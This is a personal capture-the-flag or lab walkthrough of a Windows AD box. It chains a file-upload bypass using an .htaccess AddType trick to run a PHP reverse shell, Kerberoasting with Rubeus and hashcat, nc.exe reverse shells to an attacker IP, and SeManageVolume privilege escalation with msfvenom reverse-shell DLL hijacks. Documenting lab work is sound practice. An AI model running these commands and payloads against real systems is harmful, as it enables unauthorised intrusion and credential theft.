---
Status: Done
OS: Windows AD
Difficulty: Hard
tags:
  - file_upload
  - Kerberoast
  - SeManageVolumePriv
Date: 2026-10-15T19:46:00
Owned: 2026-10-17T18:43:00
---

---
# Enumeration
## port scan

```sh
rustscan -a 192.168.151.187 --ulimit 5000 | tee rust.txt
```

![[Pasted image 20261015194747.png]]

## SMB
anonymous access  
![[Pasted image 20261015195041.png]]

guest access  
![[Pasted image 20261015195058.png]]

## WEB
port 80  
![[Pasted image 20261015195222.png]]

port 443  
![[Pasted image 20261015195314.png]]

### dir enum
```sh
feroxbuster -u http://192.168.151.187 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

found /uploads can directory listing but no file there  
![[Pasted image 20261015195450.png]]

/forms  
![[Pasted image 20261015195628.png]]
![[Pasted image 20261015195638.png]]

/assets found this bit seems interesting  ![[Pasted image 20261015195747.png]]

idk not quite yet  
![[Pasted image 20261015195904.png]]

### initial foothold svc_apache
from footer of the site  
![[Pasted image 20261015200152.png]]

the site was made with BootstrapMade  


on the site there is buy ticket function  
![[Pasted image 20261015200331.png]]

once we click on buy now there is file upload function  
![[Pasted image 20261015200453.png]]

let's try php revshells  
try uploading the ivan sincek php from revshell.com  
![[Pasted image 20261015200552.png]]

blocked  

let's try basic bypass changing extension to .pHp  
still blocked  

this time I try revshell.php.png  
![[Pasted image 20261015201146.png]]

our shell was uploaded  
![[Pasted image 20261015201221.png]]

tried many things it were not executed  
![[Pasted image 20261015202233.png]]

the problem here is the file are not being execute  

to get around this  
https://infosecwriteups.com/solution-breakdown-web-shell-upload-via-extension-blacklist-bypass-dedc51243379

we need to upload .htaccess file with following content  
```
AddType application/x-httpd-php .l33t
```

now the server will now that the file .l33t need to be executed as php file  

once we have the .htaccess uploaded i tried clicking the revshells.l33t again  
![[Pasted image 20261015203351.png]]

this time we actually got revshell  

check for credential  
![[Pasted image 20261015204541.png]]

however, there was no port 3306 which is used for mysql opened  

# Priv Escalation svc_mssql

## upload Enum scrip with penelope
from penelope let's upload the winpeas to target  

from the shell we have hit Ctrl+D to detach session  
we can then upload winpeas using penelope modules  

![[Pasted image 20261017153947.png]]

upload the script  
```sh
run upload_privesc_scripts winpeas
```
![[Pasted image 20261017154026.png]]

to get back to our shell  
```
sessions 1
```

run the winpeas  

nothing interesting  

## Tunneling with ligolo-ng

set up ligolo  
![[Pasted image 20261017160622.png]]

upload agent to target  
```
certutil.exe -urlcache -f http://192.168.45.204/agent.exe agent.exe
```

run the agent  
```powershell 
.\agent.exe -connect 192.168.45.204:11601 -ignore-cert
```

change of plan since we couldn't upload agent.exe since the shell kinda buggy  

## Kerberoasting

currently we are svc_apache and there is no flag  
![[Pasted image 20261017163953.png]]

we wan't to gain access as svc_mssql somehow  

try uploading Rubeus  
```
certutil.exe -urlcache -f http://192.168.45.204/Rubeus.exe Rubeus.exe
```

extract hashes  
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

found one  
![[Pasted image 20261017164628.png]]

crack with hashcat  
```
hashcat -m 13100 svc_mssql.hash /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20261017164808.png]]

## Change user

tried connecting as svc_mssql using evil-winrm but failed  

let's just run runasCs from the shell we have  
```
certutil.exe -urlcache -f http://192.168.45.204/RunasCs.exe RunasCs.exe
```

run the runas command  
```
.\RunasCs.exe svc_mssql trustno1 "cmd /c whoami"
```

![[Pasted image 20261017172617.png]]

upload nc.exe  
```
certutil.exe -urlcache -f http://192.168.45.204/nc.exe nc.exe
```
let's get revshell  
```
.\RunasCs.exe svc_mssql trustno1 ".\nc.exe 192.168.45.204 1337 -e cmd.exe" -t 0
```

from svc_mssql  
![[Pasted image 20261017174418.png]]

get the flag  
![[Pasted image 20261017175311.png]]
# Priv Escalation to Admin

## SeManageVolumePriv
```
whoami /priv
```
![[Pasted image 20261017174532.png]]

found this on hacktricks  
https://www.hackingarticles.in/windows-privilege-escalation-semanagevolumeprivilege/

Added, initially i tried replacing dll but got permission error  
We need to run this exploit first to gain permission  
https://github.com/CsEnox/SeManageVolumeExploit

```sh
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
```

get it on target  
```
certutil.exe -urlcache -f http://192.168.45.204/SeManageVolumeExploit.exe SeManageVolumeExploit.exe
```

run the exploit  
```
./SeManageVolumeExploit.exe
```
![[Pasted image 20261017183110.png]]

check the results  
```
icacls C:/Windows
```
![[Pasted image 20261017183134.png]]

## Printconfig.dll
let's use the print spooler dll hijack  
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.204 lport=4444 -f dll -o Printconfig.dll


python -m http.server 80
```

get the file on target  
```powershell
certutil.exe -urlcache -f http://192.168.45.204/Printconfig.dll Printconfig.dll
```

![[Pasted image 20261017175629.png]]

follow the steps  
```Powershell
copy Printconfig.dll C:/Windows/System32/spool/drivers/x64/3/

$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")

$object = [Activator]::CreateInstance($type)
```

done  
![[Pasted image 20261017184010.png]]

on our listener we got shell  
![[Pasted image 20261017184107.png]]

get the proof.txt  
![[Pasted image 20261017184328.png]]



# Another dll we could try
## **WBEM tzres.dll Hijacking → NT AUTHORITY\NETWORK SERVICE**

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.204 lport=4444 -f dll -o tzres.dll

python3 -m http.server 80
```

copy file to replace the dll  
```
certutil.exe -urlcache -f http://192.168.45.204/tzres.dll tzres.dll
copy tzres.dll C:/Windows/System32/wbem/
```

![[Pasted image 20261017180720.png]]

replace, what denied again  
![[Pasted image 20261017180937.png]]

tried again after granting modify permisssion  

![[Pasted image 20261017183248.png]]

set up the listener  
```sh
sudo rlwrap nc -lvnp 4444
```
trigger the process  
```
systeminfo
```
